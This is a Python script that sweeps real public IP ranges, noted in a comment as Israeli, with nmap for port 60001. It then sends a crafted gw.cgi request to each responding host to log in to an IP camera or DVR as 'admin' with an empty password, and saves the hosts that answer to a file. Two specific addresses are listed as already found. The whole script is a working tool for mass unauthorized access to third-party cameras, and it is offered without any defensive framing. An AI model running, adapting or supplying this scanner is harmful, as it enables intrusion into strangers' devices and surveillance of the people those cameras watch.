import nmap, requests, os.path

url_after_password = '/cgi-bin/gw.cgi?xml=%3Cjuan%20ver=%22%22%20squ=%22%22%20dir=%220%22%3E%3Crpermission%20usr=%22admin%22%20pwd=%22%22%3E%3Cconfig%20base=%22%22/%3E%3Cplayback%20base=%22%22/%3E%3C/rpermission%3E%3C/juan%3E&_=1581953285673'
print('welcome\n')
# known ip interval 93.172.0.0 until 93.173.255.255 from 'https://lite.ip2location.com/israel-ip-address-ranges'
first_founded_ip = '93.172.132.211'
second_founded_ip = '93.172.132.38'
ip_from_Database_dipper = '93.172.'
ip_from_Database= '93.172.132.'
print('you entered :', ip_from_Database + 'xxx' + '\n', flush=True)
nm = nmap.PortScanner()  # make new object for scan
dict_of_relevant_ip = []


def lolipoplevel_4(ip, start, end):
    for forth_ip_part in range(start, end):
        ip_that_i_check = ip + str(forth_ip_part)  # need to be 'ip_from_Database' if want to check function
        print('scan now : ' + ip_that_i_check, flush=True)
        try:
            nm.scan(ip_that_i_check, '60001')
            print("nmap works fine", flush=True)
        except:
            print('try again, exit from program', flush=True)
            nm.scan(ip_that_i_check, '60001')
            exit()
        print('response from server : ' + nm[ip_that_i_check].tcp(60001)['reason'], flush=True)
        print('state of server : ', nm[ip_that_i_check].state(), flush=True)
        if nm[ip_that_i_check].tcp(60001)['reason'] != 'no-response':
            r = requests.get('http://' + ip_that_i_check + ':60001' + url_after_password)
            print('request status is : ', r.status_code, flush=True)
            if r.status_code == 200:
                if r.content.__len__() == 175:  # password been checked and verified plus its a UI for camera
                    print('user_name : admin & password : "null"(empty)', flush=True)
                    dict_of_relevant_ip.append(ip_that_i_check)
                    try:
                        if os.path.isfile('dict.txt'):
                            f = open("dict.txt", "a+")
                            f.write(str(dict_of_relevant_ip))
                            f.close()
                            print('Ip added to dict.txt')
                        else:
                            f = open("dict.txt", "w")
                            print('made new file dict.txt')
                            f.write(str(dict_of_relevant_ip))
                            f.close()
                            print('Ip added to dict.txt')
                    except:
                        print('not saved on file')
                        exit()
        print('\n', flush=True)





def lolipoplevel_3(ip_level_3, start, end):
    for third_part_ip in range(start, end):
        print("im here 2")
        ip_level_3 = ip_from_Database_dipper + str(third_part_ip) + '.'
        print(ip_level_3)
        lolipoplevel_4(ip_level_3, 0, 255)  # 93.172.third_part_ip.0-255 , third part is (start '0' until end '255')

print("i'm here")
# lolipoplevel_3(ip_from_Database_dipper, 132, 134)  # Ip's beetwen 93.172.110.0 - 93.172.132.255
# lolipoplevel_4(ip_from_Database, 0, 255)  # Ip's beetwen 93.172.132.0 - 93.172.132.255
lolipoplevel_4(ip_from_Database, 35, 50)  # Ip's beetwen 93.172.132.35 - 93.172.132.50
lolipoplevel_4(ip_from_Database, 205, 215)  # Ip's beetwen 93.172.132.205 - 93.172.132.215


print('ip that nmap found open :')
print(dict_of_relevant_ip)

exit()
